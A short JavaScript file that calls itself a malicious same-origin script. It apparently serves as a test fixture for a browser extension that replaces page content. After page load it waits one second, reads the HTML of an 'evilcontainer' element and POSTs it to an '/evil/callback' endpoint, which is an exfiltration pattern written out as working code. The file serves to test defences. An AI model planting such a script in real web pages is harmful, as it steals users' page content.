/**
 * This is a malicious piece of JavaScript that is served on the same origin as the server.
 * This might arise from a compromised web server, malicious developers, or through XSS
 * vulnerabilities on the web application.
 */

document.addEventListener('DOMContentLoaded', function() {
  // Wait for 1 second for the Chrome extension to finish replacement
  setTimeout(function() {
    // Get HTML content from the page
    var data = new FormData();
    data.append('html', document.getElementById('evilcontainer').outerHTML);

    // Send XMLHttpRequest
    const XHR = new XMLHttpRequest();
    XHR.open('POST', '/evil/callback');
    XHR.send(data);

    console.info('Evil deed complete, hehehe...');
  }, 1000);
});
